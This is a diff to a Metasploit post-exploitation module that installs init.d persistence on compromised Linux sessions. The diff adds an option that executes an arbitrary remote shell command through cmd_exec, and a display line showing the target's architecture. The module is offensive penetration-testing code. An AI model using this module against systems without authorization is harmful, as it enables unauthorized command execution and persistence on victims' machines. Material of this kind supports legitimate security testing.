@@ -27,6 +27,7 @@
 # Time to wait for the agent to start   (in seconds) => set START_TIME 15
 # The full remote path of init.d directory  (remote) => set INIT_PATH /etc/init.d
 # Delete persistence script/configurations  (remote) => set DEL_PERSISTENCE true
+# Execute one simple bash command           (remote) => set SINGLE_COM uname -a
 # Use agents with [shebang]? (eg #!/usr/bin/python)  => set SHEBANG true
 # ---
 # If sellected 'SHEBANG true' then agent execution will be based on is shebang
@@ -140,6 +141,7 @@ class MetasploitModule < Msf::Post
 
                 register_advanced_options(
                         [
+                                OptString.new('SINGLE_COM', [ false, 'Execute one simple command (eg uname -a)']),
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence script/configurations?' , false]),
                                 OptString.new('INIT_PATH', [ false, 'The full remote path of init.d directory (eg /etc/init.d)'])
@@ -364,6 +366,48 @@ end
 
 
 
+#
+# Execute single_command (shell) and return output ..
+#
+def ls_stage3
+
+  session = client
+  rem = session.sys.config.sysinfo
+  exe_com = datastore['SINGLE_COM']  # uname -a
+  #
+  # check for proper config settings enter
+  # to prevent 'unset all' from deleting default options ..
+  #
+  if datastore['SINGLE_COM'] == 'nil'
+    print_error("Options not configurated correctly ..")
+    print_warning("Please set SINGLE_COM option!")
+    return nil
+  else
+    print_status("Executing remote bash command  ..")
+    Rex::sleep(1.0)
+  end
+
+      #
+      # msf API call to execute bash command remotlly  ..
+      #
+      print_good("Executing: #{exe_com}")
+      Rex::sleep(1.0)
+      output = cmd_exec("#{exe_com}")
+      print_line("")
+      print_line(output)
+      print_line("")
+      Rex::sleep(1.0)
+
+  #
+  # error exception funtion
+  #
+  rescue ::Exception => e
+  print_error("Error: #{e.class} #{e}")
+
+end
+
+
+
 
 #
 # MAIN DISPLAY WINDOWS (ALL MODULES - def run)
@@ -386,6 +430,7 @@ def run
     print_line("")
     print_line("    Running on session  : #{datastore['SESSION']}")
     print_line("    Computer            : #{sysnfo['Computer']}")
+    print_line("    Target Architecture : #{sysnfo['Architecture']}")
     print_line("    Operative System    : #{sysnfo['OS']}")
     print_line("    Target IP addr      : #{runsession}")
     print_line("    Payload directory   : #{directory}")
@@ -433,5 +478,10 @@ def run
       if datastore['DEL_PERSISTENCE']
          ls_stage2
       end
+
+      if datastore['SINGLE_COM']
+         ls_stage3
+      end
+
    end
 end
